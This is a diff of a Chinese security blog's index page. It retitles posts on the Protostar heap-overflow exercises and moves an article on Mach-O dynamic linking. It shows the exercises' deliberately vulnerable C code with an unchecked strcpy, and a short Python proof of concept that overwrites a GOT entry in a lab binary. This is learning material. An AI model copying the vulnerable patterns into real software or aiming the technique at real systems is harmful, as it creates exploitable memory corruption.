@@ -277,7 +277,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/">Protostar-堆溢出系列学习-heap UAF</a>
+      <a class="article-title" href="2017/04/13/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/">Protostar-堆溢出学习-UAF(use after free)</a>
     </h1>
   
 
@@ -345,99 +345,6 @@
 
 
   
-    <article id="post-mach-o动态链接/mach-o动态链接" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2017/04/10/mach-o动态链接/mach-o动态链接/">Mach-o动态链接</a>
-    </h1>
-  
-
-        
-        <a href="2017/04/10/mach-o动态链接/mach-o动态链接/" class="archive-article-date">
-  	<time datetime="2017-04-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>可执行文件很少是独立的，除了极少数的一些静态链接的可执行文件以外，大多的都是动态链接，这就需要依赖一些预先存在的库，这些库可以是操作系统提供的动态共享库，也可以是第三方的库。<br>所以在可执行文件中充满了大量对外部库的符号的引用，这些空洞就需要动态链接器来完成所谓的符号绑定。<br>macOS中是内核执行<code>LC_DYLINKER</code>加载命令时启动的，通常为<code>/usr/lib/dyld</code>接管刚创建进程的控制权。<br>本文就来分析其符号的动态链接过程。</p>
-<h2 id="0x01-符号的加载过程"><a href="#0x01-符号的加载过程" class="headerlink" title="0x01 符号的加载过程"></a>0x01 符号的加载过程</h2><p>以下面这个简单的C语言程序为例。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"first printf"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"second printf"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>对应的汇编代码</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">-&gt;  <span class="number">0x100000f40</span> &lt;+<span class="number">0</span>&gt;:  pushq  %rbp</div><div class="line">    <span class="number">0x100000f41</span> &lt;+<span class="number">1</span>&gt;:  movq   %rsp, %rbp</div><div class="line">    <span class="number">0x100000f44</span> &lt;+<span class="number">4</span>&gt;:  subq   $0x2<span class="number">0</span>, %rsp</div><div class="line">    <span class="number">0x100000f48</span> &lt;+<span class="number">8</span>&gt;:  leaq   <span class="number">0x4b</span>(%rip), %rax          ; <span class="string">"first printf"</span></div><div class="line">    <span class="number">0x100000f4f</span> &lt;+<span class="number">15</span>&gt;: movl   %edi, -<span class="number">0x4</span>(%rbp)</div><div class="line">    <span class="number">0x100000f52</span> &lt;+<span class="number">18</span>&gt;: movq   %rsi, -<span class="number">0x10</span>(%rbp)</div><div class="line">    <span class="number">0x100000f56</span> &lt;+<span class="number">22</span>&gt;: movq   %rax, %rdi</div><div class="line">    <span class="number">0x100000f59</span> &lt;+<span class="number">25</span>&gt;: movb   $0<span class="keyword">x</span><span class="number">0</span>, %al</div><div class="line">    <span class="number">0x100000f5b</span> &lt;+<span class="number">27</span>&gt;: callq  <span class="number">0x100000f7a</span>               ; symbol stub <span class="keyword">for</span>: <span class="keyword">printf</span></div><div class="line">    <span class="number">0x100000f60</span> &lt;+<span class="number">32</span>&gt;: leaq   <span class="number">0x40</span>(%rip), %rdi          ; <span class="string">"second printf"</span></div><div class="line">    <span class="number">0x100000f67</span> &lt;+<span class="number">39</span>&gt;: movl   %eax, -<span class="number">0x14</span>(%rbp)</div><div class="line">    <span class="number">0x100000f6a</span> &lt;+<span class="number">42</span>&gt;: movb   $0<span class="keyword">x</span><span class="number">0</span>, %al</div><div class="line">    <span class="number">0x100000f6c</span> &lt;+<span class="number">44</span>&gt;: callq  <span class="number">0x100000f7a</span>               ; symbol stub <span class="keyword">for</span>: <span class="keyword">printf</span></div><div class="line">    <span class="number">0x100000f71</span> &lt;+<span class="number">49</span>&gt;: movl   %eax, -<span class="number">0x18</span>(%rbp)</div><div class="line">    <span class="number">0x100000f74</span> &lt;+<span class="number">52</span>&gt;: addq   $0x2<span class="number">0</span>, %rsp</div><div class="line">    <span class="number">0x100000f78</span> &lt;+<span class="number">56</span>&gt;: popq   %rbp</div><div class="line">    <span class="number">0x100000f79</span> &lt;+<span class="number">57</span>&gt;: retq</div></pre></td></tr></table></figure>
-<p>和大多数的Linux系统一样，mach-o符号的动态绑定也采用了打桩机制，简单的说就是在遇到外部符号的时候就会先跳转到stub区</p>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/stub%E5%8C%BA.png?raw=true" alt="stub区"></p>
-<ul>
-<li>第一次printf会先进入<code>dyld_stub_binder</code>区去找到<code>printf</code>函数的地址，我们用lldb调试观察<code>DATA</code>段<code>la_symbol_ptr</code>区地址值</li>
-</ul>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/stub%E8%B7%B3%E8%BD%AC%E8%BF%87%E7%A8%8B.png?raw=true" alt="stub跳转过程"><br>会发现正好地址在<code>dyld_stub_binder</code>区</p>
-<p>验证:</p>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/la_symbol_ptr%E9%AA%8C%E8%AF%811.png?raw=true" alt="验证1"></p>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/la_symbol_ptr%E9%AA%8C%E8%AF%812.png?raw=true" alt="验证1"></p>
-<ul>
-<li>第二次<code>printf</code>我们在观察<code>DATA</code>段<code>la_symbol_ptr</code>区地址值</li>
-</ul>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/%E7%AC%AC%E4%BA%8C%E6%AC%A1printf%E9%AA%8C%E8%AF%81.png?raw=true" alt="第二次"></p>
-<p>我们会发现当第二次再次调用<code>printf</code>函数时，还是会先跳转到stub区，但此时<code>la_symbol_ptr</code>中的值却变为了<code>printf</code>的真实地址，而不是<code>dyld_stub_binder</code>。这样就完成了一次延时绑定，后面就直接调用。</p>
-<h2 id="0x02-stub桩机制总结"><a href="#0x02-stub桩机制总结" class="headerlink" title="0x02 stub桩机制总结"></a>0x02 stub桩机制总结</h2><p>综上分析，我们可以发现所有的外部函数引用都会在<code>DATA</code>段<code>la_symbol_ptr</code>区中产生一个占位符，其初始值为<code>dyld_stub_binder</code>区中对应的编号地址。当第一个调用时，就会进入符号的动态链接过程，一旦找到其地址后，就会将<code>DATA</code>段<code>la_symbol_ptr</code>区中的占位符改为找到后的地址。这样就完成了只需要一个符号绑定。</p>
-<p>stub桩机制的巧妙之处也在此，首先当产生一个外部符号调用时，直接跳到对应的stub桩位置，然后由里面保存的地址来判断是第一次调用还是已经找到符号的地址。就像桩这个名字含义一样，一个占位符的思想。</p>
-<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" target="_blank" rel="external">Mach-O的动态链接相关知识</a></p>
-<p><a href="http://timetobleed.com/dynamic-linking-elf-vs-mach-o/" target="_blank" rel="external">Dynamic Linking: ELF vs. Mach-O</a></p>
-<p><a href="http://timetobleed.com/dynamic-symbol-table-duel-elf-vs-mach-o-round-2/" target="_blank" rel="external">Dynamic symbol table duel: ELF vs Mach-O, round 2</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">mach-o</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">dyld</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">stub</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="2017/04/10/mach-o动态链接/mach-o动态链接/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
     <article id="post-Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -445,7 +352,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/">Protostar-堆溢出系列学习-heap 0</a>
+      <a class="article-title" href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/">Protostar-堆溢出学习-覆盖堆函数指针劫持代码流</a>
     </h1>
   
 
@@ -459,7 +366,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。</p>
-<h2 id="0x01-heap0"><a href="#0x01-heap0" class="headerlink" title="0x01 heap0"></a>0x01 heap0</h2><p><code>C代码</code></p>
+<h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><p><code>C代码</code></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> data &#123;</div><div class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> fp &#123;</div><div class="line">  <span class="keyword">int</span> (*fp)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">nowinner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level has not been passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> data *d;</div><div class="line">  <span class="keyword">struct</span> fp *f;</div><div class="line"></div><div class="line">  d = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> data));</div><div class="line">  f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fp));</div><div class="line">  f-&gt;fp = nowinner;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"data is at %p, fp is at %p\n"</span>, d, f);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(d-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  </div><div class="line">  f-&gt;fp();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p>
 <p>可以知道我们需要去执行<code>winner</code>函数，怎么做到呢？</p>
@@ -567,7 +474,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/">Protostar-堆溢出系列学习-heap 1</a>
+      <a class="article-title" href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/">Protostar-堆溢出学习-strcpy堆指针造成任意地址GOT表写</a>
     </h1>
   
 
@@ -581,8 +488,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。</p>
-<h2 id="0x01-heap1"><a href="#0x01-heap1" class="headerlink" title="0x01 heap1"></a>0x01 heap1</h2><p>C代码</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> internet &#123;</div><div class="line">  <span class="keyword">int</span> priority;</div><div class="line">  <span class="keyword">char</span> *name;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> internet *i1, *i2, *i3;</div><div class="line"></div><div class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i1-&gt;priority = <span class="number">1</span>;</div><div class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i2-&gt;priority = <span class="number">2</span>;</div><div class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> internet &#123;</div><div class="line">  <span class="keyword">int</span> priority;</div><div class="line">  <span class="keyword">char</span> *name;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> internet *i1, *i2, *i3;</div><div class="line"></div><div class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i1-&gt;priority = <span class="number">1</span>;</div><div class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i2-&gt;priority = <span class="number">2</span>;</div><div class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <h2 id="0x02-简单的分析-amp-思考"><a href="#0x02-简单的分析-amp-思考" class="headerlink" title="0x02 简单的分析&amp;思考"></a>0x02 简单的分析&amp;思考</h2><p>如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个<code>strcpy</code>，肯定是要去覆盖和修改某个地方的地址。<br>其实<code>strcpy</code>这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。<br>在这个列子中，我们就借此去修改<code>printf</code>函数的GOT表。</p>
 <h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.查看堆分配情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-0.png?raw=true" alt="0-0"><br>2.查看汇编代码，找到执行入口<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-1.png?raw=true" alt="0-1"><br>3.首先利用第一个<code>strcpy</code>将i2的name指针改为GOT表地址，然后利用第二个<code>strcpy</code>向这个地址写入<code>winner</code>的地址，由此编写对应的Python PoC</p>
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"AAAA"</span>*<span class="number">5</span></div><div class="line">put_got = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8049774</span>) <span class="meta">#put的GOT表地址</span></div><div class="line">space = <span class="string">" "</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048494</span>) <span class="meta">#winner函数地址</span></div><div class="line"><span class="built_in">print</span> padding+put_got+space+winner</div></pre></td></tr></table></figure>
@@ -622,6 +528,99 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-mach-o动态链接/mach-o动态链接" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2017/04/10/mach-o动态链接/mach-o动态链接/">Mach-o动态链接</a>
+    </h1>
+  
+
+        
+        <a href="2017/04/10/mach-o动态链接/mach-o动态链接/" class="archive-article-date">
+  	<time datetime="2017-04-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>可执行文件很少是独立的，除了极少数的一些静态链接的可执行文件以外，大多的都是动态链接，这就需要依赖一些预先存在的库，这些库可以是操作系统提供的动态共享库，也可以是第三方的库。<br>所以在可执行文件中充满了大量对外部库的符号的引用，这些空洞就需要动态链接器来完成所谓的符号绑定。<br>macOS中是内核执行<code>LC_DYLINKER</code>加载命令时启动的，通常为<code>/usr/lib/dyld</code>接管刚创建进程的控制权。<br>本文就来分析其符号的动态链接过程。</p>
+<h2 id="0x01-符号的加载过程"><a href="#0x01-符号的加载过程" class="headerlink" title="0x01 符号的加载过程"></a>0x01 符号的加载过程</h2><p>以下面这个简单的C语言程序为例。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"first printf"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"second printf"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>对应的汇编代码</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">-&gt;  <span class="number">0x100000f40</span> &lt;+<span class="number">0</span>&gt;:  pushq  %rbp</div><div class="line">    <span class="number">0x100000f41</span> &lt;+<span class="number">1</span>&gt;:  movq   %rsp, %rbp</div><div class="line">    <span class="number">0x100000f44</span> &lt;+<span class="number">4</span>&gt;:  subq   $0x2<span class="number">0</span>, %rsp</div><div class="line">    <span class="number">0x100000f48</span> &lt;+<span class="number">8</span>&gt;:  leaq   <span class="number">0x4b</span>(%rip), %rax          ; <span class="string">"first printf"</span></div><div class="line">    <span class="number">0x100000f4f</span> &lt;+<span class="number">15</span>&gt;: movl   %edi, -<span class="number">0x4</span>(%rbp)</div><div class="line">    <span class="number">0x100000f52</span> &lt;+<span class="number">18</span>&gt;: movq   %rsi, -<span class="number">0x10</span>(%rbp)</div><div class="line">    <span class="number">0x100000f56</span> &lt;+<span class="number">22</span>&gt;: movq   %rax, %rdi</div><div class="line">    <span class="number">0x100000f59</span> &lt;+<span class="number">25</span>&gt;: movb   $0<span class="keyword">x</span><span class="number">0</span>, %al</div><div class="line">    <span class="number">0x100000f5b</span> &lt;+<span class="number">27</span>&gt;: callq  <span class="number">0x100000f7a</span>               ; symbol stub <span class="keyword">for</span>: <span class="keyword">printf</span></div><div class="line">    <span class="number">0x100000f60</span> &lt;+<span class="number">32</span>&gt;: leaq   <span class="number">0x40</span>(%rip), %rdi          ; <span class="string">"second printf"</span></div><div class="line">    <span class="number">0x100000f67</span> &lt;+<span class="number">39</span>&gt;: movl   %eax, -<span class="number">0x14</span>(%rbp)</div><div class="line">    <span class="number">0x100000f6a</span> &lt;+<span class="number">42</span>&gt;: movb   $0<span class="keyword">x</span><span class="number">0</span>, %al</div><div class="line">    <span class="number">0x100000f6c</span> &lt;+<span class="number">44</span>&gt;: callq  <span class="number">0x100000f7a</span>               ; symbol stub <span class="keyword">for</span>: <span class="keyword">printf</span></div><div class="line">    <span class="number">0x100000f71</span> &lt;+<span class="number">49</span>&gt;: movl   %eax, -<span class="number">0x18</span>(%rbp)</div><div class="line">    <span class="number">0x100000f74</span> &lt;+<span class="number">52</span>&gt;: addq   $0x2<span class="number">0</span>, %rsp</div><div class="line">    <span class="number">0x100000f78</span> &lt;+<span class="number">56</span>&gt;: popq   %rbp</div><div class="line">    <span class="number">0x100000f79</span> &lt;+<span class="number">57</span>&gt;: retq</div></pre></td></tr></table></figure>
+<p>和大多数的Linux系统一样，mach-o符号的动态绑定也采用了打桩机制，简单的说就是在遇到外部符号的时候就会先跳转到stub区</p>
+<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/stub%E5%8C%BA.png?raw=true" alt="stub区"></p>
+<ul>
+<li>第一次printf会先进入<code>dyld_stub_binder</code>区去找到<code>printf</code>函数的地址，我们用lldb调试观察<code>DATA</code>段<code>la_symbol_ptr</code>区地址值</li>
+</ul>
+<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/stub%E8%B7%B3%E8%BD%AC%E8%BF%87%E7%A8%8B.png?raw=true" alt="stub跳转过程"><br>会发现正好地址在<code>dyld_stub_binder</code>区</p>
+<p>验证:</p>
+<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/la_symbol_ptr%E9%AA%8C%E8%AF%811.png?raw=true" alt="验证1"></p>
